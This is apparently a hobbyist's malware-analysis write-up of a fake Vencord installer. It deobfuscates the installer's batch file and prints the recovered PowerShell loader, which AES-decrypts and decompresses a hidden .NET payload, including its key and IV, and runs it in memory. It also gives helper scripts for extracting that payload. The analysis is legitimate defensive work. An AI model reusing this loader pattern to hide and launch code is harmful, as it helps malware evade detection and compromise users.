# Intro

This document is all about my adventure reverse engineering the fake download at https://vencord.lol/.

Vencord is a client modification for Discord. It's offical website is https://vencord.dev/. Many impersonation websites have popped up,
such as https://vencord.app/ and the now-taken-down https://vencord.xyz/. These have popped enough for me to make a [Vencord Impersonation Reporter](https://github.com/MrDiamondDog/Vencord-Impersonation-Reporter)-
which scans every TLD (Top Level Domain) named "vencord". It runs every day and eventually found this website.

## Vencord.lol

On 3/28/2024, Imperonsation Reporter found vencord.lol, and when I went to investigae, it was an almost exact copy of vencord.dev. No other buttons
worked other than the download button, which redirected you to https://ven.lol/. There is nothing on this page except for a very ominous "[click to enter]" (clicking does nothing)

After a while, it downloads a file just named "Loader.zip". Running it through VirusTotal finds nothing, so I opened it. Inside, there are only 2 files:

![image](https://gist.github.com/assets/84212701/bce802a8-81fa-4253-a9b4-20f687c1192f)

A text file named "Enjoy!.txt" with no content, and a Loader.bat.

## Obfuscation Layer #1: Loader.bat

Running this file obviously seemed like a bad idea, so I did the next logical solution: editing it.

This is what the file looks like.

![image](https://gist.github.com/assets/84212701/534e7aae-84d7-42d1-adf2-626443e8aed0)

This goes on for about 5,000 lines, 16,000,000 characters.

Investigating further (asking chatgpt) discovered that all the really long lines are variable declarations:

```
%hUJIgPwfGgrrCrsQKqFLYzLieMkgbqdaShWtGLtgygfmzwglVXXqSLBHiBDtEqeqcryvuZjYXzmRuzIHGYkdsNhgFokeiZBibPjhYKRVNZttzKnISWNFfbYpksQfOfQX:hUJIgOwgGgqqCqrPKpGLYzLidMkgbpdaRhXuGLugygglzxglVYXpRLBHiBDuFpdpcqyvvZjYXzmQuzIHGYkdrMhgFokdiZBibOjhYKQWNZuuzJnIRWNGfaYokrPf=%"RUXFUMhIjw%XeQE%o "
```

Everything before the equals sign is garbage to obfuscate the data more. It ends up resolving to a previously defined variable that contains `set `
This means that everything after the equals is actually a `set` operation.

The set data looks like this: `"RUXFUMhIjw%XeQE%o "`. 
Everything before the `%XeQE%` is the name of the variable, and everything after is what to set it to.
So in this case, `RUXFUMhIjw = "o "`

The entire file is separated into blocks of definitions and lines that look like this: `%pBJVhoptuN%%HVbBllmVca%%RUXFUMhIjw%%vuTJtrmSyQ%%LEVwLUemUE%`.
These lines are combining all the previous variables into a command, that the batch file executes.

After figuring this out, I realized this would be *really* easy to write a de-obfuscator for. So I made this in TypeScript:

```ts
import fs from "fs";

const definitionRegex = /%[A-z]{128}:[A-z]{124}=%"(.*)%XeQE%(.*)"/;
const subDefinitionRegex = /%[A-z]{4}%"([A-z]{10})=(.*)"/;
const variableRegex = /%([A-z]*)%/g;

const text = fs.readFileSync(process.argv[2], { encoding: "utf-8" });
const lines = text.split("\n");

function resolveVars(str: string) {
    return str.replace(variableRegex, (match, p1) => {
        return definitions[p1] || match;
    });
}

const definitions: Record<string, string> = {};
const commands: string[] = [];
let i = 0;
for (const line of lines) {
    const match = line.match(definitionRegex);
    // definition
    if (match) {
        definitions[match[1]] = match[2];
        console.log(i, "def:", match[1], "=", match[2])
    } else {
        const parts = line.split("%").filter(Boolean);
        let command = "";
        for (const part of parts) {
            if (definitions[part]) {
                command += definitions[part];
            }
        }

        command = resolveVars(command);

        const subMatch = command.match(subDefinitionRegex);
        if (subMatch) {
            definitions[subMatch[1]] = subMatch[2];
            console.log(i, "def:", subMatch[1], "=", subMatch[2]);
        } else {
            commands.push(command);
            console.log(i, "cmd: ", command);
        }
    }

    i++;
}

// resolve variables
for (let i = 0; i < commands.length; i++) {
    commands[i] = resolveVars(commands[i]);
    commands[i] = commands[i].replace(/\t/g, "\n");
}

console.log(commands.join("\n"));
```
(This is the final version- images shown may be in older versions of this script)

It's pretty messy, but it works. Putting the first definition-execution block into the input file and running it produced this output:

![image](https://gist.github.com/assets/84212701/e5c4d73c-f685-476c-8324-04cc4545b094)

The first line is the command it's running: `@echo off`. This means that my approach works, so this layer of obfuscation is broken.

## Layer 2: set in set

Running the same code for more def-exec blocks resulted in this:

![image](https://gist.github.com/assets/84212701/8ffbb7da-cef3-4b1a-bf95-406b166fe7c3)

So all of this ended up setting MORE variables to parts of the code, hence why this section is called `set` in `set`. `set` operations were
used to obfuscate commands, most of the commands being more `set` operations. So, I modified the code to allow for nested definitions.

After that, I ran it against the whole bat file, and this was the output.

![image](https://gist.github.com/assets/84212701/01b662fa-5d33-4cc9-a0ed-b655c7293feb)

The unobfuscated script:

```bat

set "xNSUVcbVfZ=function cabZc($wDNPY){

cls
exit /b
```

It was very clear this bat file was executing a powershell script, with even more layers of obfuscation.

## Layer 3: The Powershell Script

This script was obfuscated in multiple, smaller ways. The variable and function names were random strings, accesses to some properties were
obfuscated with tons of @ symbols, and it was formatted very poorly. The formatted script looks like this:

```ps1
function cabZc($wDNPY){
    $dpSWX=[System.Security.Cryptography.Aes]::Create();
    $dpSWX.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $dpSWX.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
    $dpSWX.Key=[System.Convert]::("FromString")('ywZ4zbvE94p0AjJdsJquIr8OfpJvLV5TpDK8RHDCawA=');
    $dpSWX.IV=[System.Convert]::("FromString")('gWYwrnLwvaEVn5azmkls4A==');
    $duCkl=$dpSWX.CreateDecryptor();
    $return_var=$duCkl.TransformFinalBlock($wDNPY, 0, $wDNPY.Length);
    $duCkl.Dispose();
    $dpSWX.Dispose();
    $return_var;
}
function xHmqd($wDNPY){
    $taHbo=New-Object System.IO.MemoryStream(,$wDNPY);
    $KwYWp=New-Object System.IO.MemoryStream;
    Invoke-Expression '$qFHGG = New-Object System.IO.Compression.GZipStream($taHbo, [IO.Compression.CompressionMode]::Decompress);';
    $qFHGG.CopyTo($KwYWp);
    $qFHGG.Dispose();
    $taHbo.Dispose();
    $KwYWp.Dispose();
    $KwYWp.ToArray();
}
function bfsQm($wDNPY,$LMHlt){
    $tDdAS = @(
    '$Tcpjt = [System.Reflection.Assembly]::Load([byte[]]$wDNPY);',
    '$YkCzb = $Tcpjt.EntryPoint;',
    '$YkCzb.Invoke($null, $LMHlt);'
    );
    foreach ($WjSSe in $tDdAS) {
        Invoke-Expression $WjSSe
    };
}

$LvKNb=[System.IO.File]::('ReadAllText')('%~f0').Split([Environment]::NewLine);

foreach ($uzAOr in $LvKNb) {
    if ($uzAOr.StartsWith('MROXEN'))
    {
        $foRxM=$uzAOr.Substring(6);
        break;
    }
}
$gIiYE=xHmqd (cabZc ([Convert]::('FromBase64String')($foRxM)));bfsQm $gIiYE (,[string[]] ('%~f0'));
```

This script can be broken down into a few steps:

- Goes back to the batch file and reads a line starting with "MROXEN"
- Decrypts the line with AES
- Reads this into a memory stream
- Executes it with `System.Reflection.Assembly`.

The first step led me to one line in the bat file. The line is 14,835,807 characters long.

## Layer 4: The Assembly

This is what I believe is the final layer. (i love spreading misinformation)

After some research, I figured out this was a .NET assembly being run. So if I could put this into a DLL somehow, I could have tools like dnSpy or ilSpy look at it.
I did a ton of work to get this to work, which I will skip since it isn't very relevant, but all that matters is I ended up with this c# script:

```cs
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.IO;
using System.Xml.Linq;

class Program
{
	static void Main(string[] args)
	{
		string byteFilePath = "path/to/bytes.txt";
		string dllFilePath = "GeneratedAssembly.dll";

		// Read bytes from file
		byte[] bytes = File.ReadAllBytes(byteFilePath);

		Console.WriteLine("Loaded " + bytes.Length + " bytes");

		// Create assembly
		AssemblyName assemblyName = new AssemblyName("GeneratedAssembly");
		AssemblyBuilder assemblyBuilder = AssemblyBuilder.DefinePersistedAssembly(assemblyName, typeof(object).Assembly);
		ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("GeneratedModule");

		Console.WriteLine("Assembly created successfully.");

		// Define type
		TypeBuilder typeBuilder = moduleBuilder.DefineType("GeneratedType", TypeAttributes.Public);

		// Define method
		MethodBuilder methodBuilder = typeBuilder.DefineMethod("Generate", MethodAttributes.Public | MethodAttributes.Static, typeof(void), new Type[0]);
		ILGenerator ilGenerator = methodBuilder.GetILGenerator();

		Console.WriteLine("IL Generation Started");

		// Generate IL to load bytes and perform operations
		for (int i = 0; i < bytes.Length; i++)
		{
			if (i % 10000 == 0)
			{
				Console.WriteLine(i + "/" + bytes.Length);
			}
			ilGenerator.Emit(OpCodes.Ldc_I4, bytes[i]); // Load byte onto the stack
			ilGenerator.Emit(OpCodes.Call, typeof(Console).GetMethod("WriteLine", new Type[] { typeof(int) })); // Call Console.WriteLine to output the byte
		}
		ilGenerator.Emit(OpCodes.Ret); // Return from method

		Console.WriteLine("IL Generation Complete");

		// Create type and save assembly
		Type generatedType = typeBuilder.CreateType();
		assemblyBuilder.Save(dllFilePath);

		Console.WriteLine("Assembly generated successfully.");
	}
}
```

This spit out a DLL file that ilSpy should be able to read. So I dragged it in, and it started deassembling it. And it was stuck loading forever, taking
up 40gb of ram. Then I tried dnSpy, but it did the same thing. Clearly I was doing something wrong.

## The Final Layer: Dear God What Is This (5/24/2024)

I asked ChatGPT 4o to use this document to help me decrypt this stupid assembly.

Somehow, it worked. This is the (surprisingly simple) script it came up with, using 2 functions that were created by the file originally:

```ps1
function cabZc($wDNPY) {
    $dpSWX=[System.Security.Cryptography.Aes]::Create();
    $dpSWX.Mode=[System.Security.Cryptography.CipherMode]::CBC;
    $dpSWX.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
    $dpSWX.Key=[System.Convert]::FromBase64String('ywZ4zbvE94p0AjJdsJquIr8OfpJvLV5TpDK8RHDCawA=');
    $dpSWX.IV=[System.Convert]::FromBase64String('gWYwrnLwvaEVn5azmkls4A==');
    $duCkl=$dpSWX.CreateDecryptor();
    $return_var=$duCkl.TransformFinalBlock($wDNPY, 0, $wDNPY.Length);
    $duCkl.Dispose();
    $dpSWX.Dispose();
    $return_var;
}

function xHmqd($wDNPY) {
    $taHbo=New-Object System.IO.MemoryStream(,$wDNPY);
    $KwYWp=New-Object System.IO.MemoryStream;
    $qFHGG = New-Object System.IO.Compression.GZipStream($taHbo, [IO.Compression.CompressionMode]::Decompress);
    $qFHGG.CopyTo($KwYWp);
    $qFHGG.Dispose();
    $taHbo.Dispose();
    $KwYWp.ToArray();
}

$encryptedData = [Convert]::FromBase64String("YourBase64StringHere");
$decryptedData = cabZc $encryptedData;
$decompressedData = xHmqd $decryptedData;

[System.IO.File]::WriteAllBytes("assembly.dll", $decompressedData);
```

Loading this into dnSpy worked immediately.

Unfortunately, it looked like this:

![image](https://gist.github.com/assets/84212701/0a284a8b-27d9-4418-895d-c3ef0cec0545)

Considering the sheer amount of obfuscation in this dll, there is absolutely no way to read this. I'm not even going to attempt to understand any of this. If you want to try, you can do all of the previous (successful) steps and it will spit out the DLL.

## Forensic Analysis

Since I can't read the dll code, I decided to find a way to run this file safely. You can find a report of this [on Hybrid Analysis](https://www.hybrid-analysis.com/sample/d52269148d7e1a3fc1dfe5f991e0279d08b35ae819d5c704beab88251f8792be). It says the file is malicous when it ran it, but it didn't actually seem to do anything.

I also ran an any.run analysis. You can review the results [here](https://app.any.run/tasks/7c4aea64-7c93-4b72-86d3-89ea7cded968).

# The End

That's it. There is nothing more to explore here- the dll file is way to obfuscated to do anything with, and actually running the file seems to not much effect on anything. This was very fun for me to make and I hope you read all of it as well. Feel free to dm me on discord (@mrdiamonddog) about any of this or if you would like to take on the challenge of figuring out what this does for yourself.
